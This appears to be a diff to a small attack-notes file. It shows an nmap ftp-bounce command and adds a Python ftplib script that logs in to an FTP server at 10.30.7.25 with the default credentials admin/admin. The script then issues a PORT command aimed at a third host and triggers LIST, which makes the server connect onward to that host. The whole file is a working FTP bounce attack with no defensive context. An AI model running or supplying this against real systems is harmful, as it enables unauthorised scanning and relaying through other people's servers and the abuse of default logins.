@@ -1,2 +1,13 @@
 # Example (adjust script-args names for your version; check script help)
 sudo nmap --script ftp-bounce --script-args "ftp.user=admin,ftp.pass=admin,ftp.bounce=169.254.131.67:10794" -p 21 10.30.7.25
+
+
+from ftplib import FTP
+ftp = FTP('10.30.7.25', timeout=5)
+ftp.login('admin','admin')
+ftp.sendcmd('PORT 169,254,131,67,42,42')
+try:
+    print(ftp.retrlines('LIST'))
+except Exception as e:
+    print('LIST failed or closed:', e)
+ftp.quit()
